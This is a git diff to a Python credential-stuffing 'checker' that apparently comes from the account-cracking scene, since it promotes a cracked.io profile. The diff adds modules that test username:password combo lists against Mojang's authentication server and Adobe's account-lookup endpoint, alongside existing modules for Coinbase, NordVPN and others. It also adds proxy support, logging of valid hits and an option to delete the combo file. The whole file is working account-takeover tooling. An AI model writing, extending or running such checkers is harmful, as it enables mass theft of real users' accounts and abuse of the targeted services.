@@ -22,11 +22,60 @@ try :
   with open("config.json") as config:
     config = json.load(config)
     log = config["log"]
+    deletecombo=config["deletecombo"]
 except:
   print('Download the Config in https://raw.githubusercontent.com/bearbearteam/python-aio/main/config.json ! ')
   time.sleep(5)
   exit()
+def save():
+  with open('config.json', 'w+') as f:
+    json.dump(config, f)
+def minecraft(combo,proxy):
+  
+  x,y = combo.split(":", 1)
+  headers = requests.utils.default_headers()
+  headers.update(
+      {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+          
+      }
+  )
+  url = 'https://authserver.mojang.com/authenticate'
+  data ={"captcha":"","captchaSupported":"","password":y,"requestUser":"true","username":x}
 
+  r = requests.post(url, json=data,headers=headers)
+  if 'error' in r.text:
+    status = 'false'
+  elif 'accessToken' in r.text:
+    status = 'true'
+  elif r.status_code ==429:
+    status = 'false'
+  else :
+    status = 'false'
+  return status
+def adobevm(combo,proxy):
+  
+  x,y = combo.split(":", 1)
+  headers = requests.utils.default_headers()
+  headers.update(
+      {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+          'X-IMS-CLIENTID': 'ngl_acrobat_reader1',
+      }
+  )
+  url = 'https://auth.services.adobe.com/signin/v2/users/accounts'
+  data ={"username":x}
+
+  r = requests.post(url, json=data,headers=headers)
+  if '[]' in r.text:
+    status = 'false'
+  elif 'id' in r.text:
+    status = 'true'
+  elif r.status_code ==429:
+    status = 'false'
+  else :
+    status = 'false'
+  return status
 def malwarebytes(combo,proxy):
   
   x,y = combo.split(":", 1)
@@ -155,8 +204,25 @@ def proxy_loader(proxyfile):
   return proxies
 
 def combo_loader():
-  print('\nModules:\n1 : GeoGussr\n2 : Curiosity Stream\n3 : NordVPN\n4 : Picstart\n5 : Coinbase\n6 : malwarebytes')
+  print('\nModules:\n1 : GeoGussr\n2 : Curiosity Stream\n3 : NordVPN\n4 : Picstart\n5 : Coinbase\n6 : malwarebytes\n7 : Adobe VM\n8 : Minecraft\nS : Settings')
   module = input('Please input module number : ')
+
+  if module == 'S':
+    print('Settings Page')
+    settingsmodule = input('1 : Log hits\n2 : Delete Combo File after checking\n->')
+    if settingsmodule== '1':
+      print('Do you want to log hits(print out)')
+      logging = input('1 : yes\n2 : no\n-> ')
+      config["log"] = logging
+    if settingsmodule == '2':
+      print('Do you want to delete combo file after checcking')
+      logging = input('1 : yes\n2 : no\n-> ')
+      config["deletecombo"] = logging     
+    print('Logging down your awnser,closing window after done! ')
+    save()
+    time.sleep(5)
+  
+    exit()
   file = input(('Please input your combo file : '))
   file2 = input(('Please input your proxy file(Only Http) : '))
 
@@ -180,6 +246,10 @@ def combo_loader():
       output = coinbase(x,proxyoutput)
     elif module == '6':
       output = malwarebytes(x,proxyoutput)
+    elif module == '7':
+      output = adobevm(x,proxyoutput)
+    elif module == '8':
+      output = minecraft(x,proxyoutput)
     else:
       print('Bruh,Chose a Valid module')
       time.sleep(10)
@@ -202,6 +272,8 @@ def combo_loader():
       f = open('results/2fa.txt','a+')
       accountwrite = (x+'\n')
       f.write(accountwrite)
+    elif output == 'false':
+      print('Invalid : ' + x)
     else:
       print(output)
   return file
@@ -213,9 +285,11 @@ sleep(5)
 
 
 output = combo_loader()
-os.remove(output)
-e = open('Nothing.txt','a+')
-pogchamp = ('Rep me on Cracked.io! cracked.io/lamlucius8 !!!!! ')
-e.write(pogchamp)
+if deletecombo == '1':
+  os.remove(output)
+  e = open('Nothing.txt','a+')
+  pogchamp = ('Rep me on Cracked.io! cracked.io/lamlucius8 !!!!! ')
+  e.write(pogchamp)
+
 print('All valid accounts will be in results folder valid.txt')
 sleep(15)
